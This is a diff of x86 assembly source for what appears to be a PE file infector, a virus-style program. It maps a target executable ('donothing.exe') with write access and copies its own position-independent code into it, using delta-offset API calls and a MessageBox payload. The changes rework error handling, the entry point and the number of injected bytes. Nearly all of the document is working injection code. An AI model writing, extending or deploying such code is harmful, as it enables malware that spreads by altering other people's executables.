@@ -38,6 +38,8 @@ GETADDR		macro	Name, Lib, Save
 .code
 
 toInject:
+jmp	start
+
 ; PE
 PeFile			dd	?
 PeMapObject		dd	?
@@ -55,7 +57,7 @@ VirtualAddress		dd	?
 SizeOfRawData		dd	?
 
 ; Debug
-ErrorMessage	db	"Error",0
+ErrorMessage	db	"Error_Injecting",0
 FileName	db	"donothing.exe",0
 String_string	db	"%s ",0
 String_number	db	"%d ",0
@@ -161,30 +163,6 @@ PDELTA	offset sHelloWorld
 push	0
 call	[DELTA pMessageBox]
 
-jmp	infect
-
-; Compare two strings : ecx/edx (EAX[0]: MATCH)
-strcmp:
-mov	al, [ecx]
-mov	ah, [edx]
-cmp	al, ah
-jne	nomatch
-test	al, al
-jz	match
-test	ah, ah
-jz	match
-inc	ecx
-inc	edx
-jmp	strcmp
-match:
-xor	eax, eax
-nomatch:
-ret
-
-
-
-
-infect:
 
 ; OPEN FILE
 push	0
@@ -208,7 +186,8 @@ push	PAGE_READWRITE
 push	NULL
 PDELTA	PeFile
 call	[DELTA pCreateFileMapping]
-call	CheckError
+cmp	eax, 0
+je	JumpCheckError
 mov	[DELTA PeMapObject], eax
 
 ; MAP_VIEW_OF_FILE
@@ -220,7 +199,8 @@ or	eax,	FILE_MAP_WRITE
 push	eax
 PDELTA	PeMapObject
 call	[DELTA pMapViewOfFile]
-call	CheckError
+cmp	eax, 0
+je	JumpCheckError
 mov	[DELTA PeFileMap], eax
 mov	ebx, eax
 
@@ -414,7 +394,7 @@ mov	[DELTA PeFile], eax
 call	CheckError
 
 ; INSERT OPCODE
-mov	ecx, [DELTA NewSectionCodeSize] ; Number of bytes
+mov	ecx, [DELTA SizeOfRawData] ; Number of bytes
 mov	esi, toInject
 add	esi, ebp ; Source bytes
 push	0
@@ -423,7 +403,8 @@ push	ecx
 push	esi
 PDELTA	PeFile
 call	[DELTA pWriteFile]
-call	CheckError
+cmp	eax, 0
+je	JumpCheckError
 
 ; CLOSE
 PDELTA	PeFile
@@ -433,6 +414,25 @@ call	[DELTA pCloseHandle]
 ; EXIT
 push	0
 call 	[DELTA pExitProcess]
+
+; UTILS
+; Compare two strings : ecx/edx (EAX[0]: MATCH)
+strcmp:
+mov	al, [ecx]
+mov	ah, [edx]
+cmp	al, ah
+jne	nomatch
+test	al, al
+jz	match
+test	ah, ah
+jz	match
+inc	ecx
+inc	edx
+jmp	strcmp
+match:
+xor	eax, eax
+nomatch:
+ret
 
 
 ; Debug
@@ -455,28 +455,28 @@ ret
 print_int	endp
 
 CheckError:
-cmp		eax, INVALID_HANDLE_VALUE
-jne		EndErrorDebug
+cmp	eax, INVALID_HANDLE_VALUE
+jne	EndErrorDebug
 JumpCheckError:
-mov		eax, offset FileName
+mov	eax, [DELTA FileName]
 call	DebugMessageBox
 push	eax
 push	0
-call	ExitProcess
+call	[DELTA pExitProcess]
 EndErrorDebug:
 ret
 
 DebugMessageBox	proc
 pusha
 push	MB_OK
-push	offset ErrorMessage
+PDELTA	offset ErrorMessage
 push	eax
 push	0
-call	MessageBox
+call	[DELTA pMessageBox]
 popa
 ret
 DebugMessageBox	endp
 
 endInject:
 
-end		start
+end		toInject
